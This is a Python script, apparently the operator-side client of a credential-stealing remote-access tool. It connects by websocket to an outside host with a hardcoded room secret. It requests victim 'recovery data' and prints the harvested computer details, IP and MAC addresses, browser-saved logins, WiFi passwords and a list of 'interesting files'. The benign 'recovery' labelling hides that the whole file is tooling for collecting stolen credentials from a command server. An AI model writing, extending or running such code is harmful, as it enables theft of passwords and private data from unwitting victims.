import asyncio
import websockets
import json

async def test_recovery():
    try:
        print("Testing recovery functionality...")
        async with websockets.connect("ws://vnc.jake.cash:3000") as websocket:
            print("✅ Connected successfully!")
            
            # Join as receiver
            join_message = {
                "type": "join",
                "role": "receiver", 
                "roomId": "ops-room",
                "secret": "boi123",
                "machineId": "RecoveryTester"
            }
            
            await websocket.send(json.dumps(join_message))
            print("✅ Joined room as receiver")
            
            # Wait for join response
            response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
            print(f"✅ Join response: {response}")
            
            # Send recovery request
            recovery_request = {
                "type": "recovery-request",
                "machineId": "RecoveryTester"
            }
            
            await websocket.send(json.dumps(recovery_request))
            print("✅ Sent recovery request - waiting for data...")
            
            # Wait for recovery data
            recovery_response = await asyncio.wait_for(websocket.recv(), timeout=30.0)
            print("✅ Received recovery data!")
            
            try:
                recovery_data = json.loads(recovery_response)
                if recovery_data.get("type") == "recovery-data":
                    data = recovery_data.get("data", {})
                    
                    print("\n🔐 === RECOVERY RESULTS ===")
                    
                    # System Info
                    sys_info = data.get("SystemInfo", {})
                    print(f"\n📊 System Information:")
                    print(f"   Computer: {sys_info.get('ComputerName', 'Unknown')}")
                    print(f"   Username: {sys_info.get('Username', 'Unknown')}")
                    print(f"   OS: {sys_info.get('OSVersion', 'Unknown')}")
                    print(f"   IP: {sys_info.get('IPAddress', 'Unknown')}")
                    print(f"   MAC: {sys_info.get('MACAddress', 'Unknown')}")
                    print(f"   CPU: {sys_info.get('CPUInfo', 'Unknown')}")
                    
                    # Browser Passwords
                    passwords = data.get("BrowserPasswords", [])
                    print(f"\n🔑 Browser Passwords ({len(passwords)} found):")
                    for i, pwd in enumerate(passwords[:5]):  # Show first 5
                        print(f"   {i+1}. {pwd.get('Browser', 'Unknown')}: {pwd.get('Username', 'Unknown')} @ {pwd.get('Url', 'Unknown')}")
                    if len(passwords) > 5:
                        print(f"   ... and {len(passwords) - 5} more")
                    
                    # WiFi Passwords
                    wifi_passwords = data.get("WiFiPasswords", [])
                    print(f"\n📡 WiFi Passwords ({len(wifi_passwords)} found):")
                    for i, wifi in enumerate(wifi_passwords[:5]):  # Show first 5
                        print(f"   {i+1}. {wifi.get('SSID', 'Unknown')}: {wifi.get('Password', 'No password')}")
                    if len(wifi_passwords) > 5:
                        print(f"   ... and {len(wifi_passwords) - 5} more")
                    
                    # Interesting Files
                    files = data.get("InterestingFiles", [])
                    print(f"\n📁 Interesting Files ({len(files)} found):")
                    for i, file in enumerate(files[:10]):  # Show first 10
                        size_mb = file.get('Size', 0) / (1024 * 1024)
                        print(f"   {i+1}. {file.get('Name', 'Unknown')} ({size_mb:.2f} MB) - {file.get('Extension', 'Unknown')}")
                    if len(files) > 10:
                        print(f"   ... and {len(files) - 10} more")
                    
                    print(f"\n🎉 Recovery completed successfully!")
                    print(f"📈 Total: {len(passwords)} passwords, {len(wifi_passwords)} WiFi networks, {len(files)} files")
                    
                else:
                    print(f"❌ Unexpected response type: {recovery_data.get('type')}")
                    
            except json.JSONDecodeError:
                print(f"❌ Could not parse JSON response: {recovery_response[:200]}...")
            
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    asyncio.run(test_recovery())
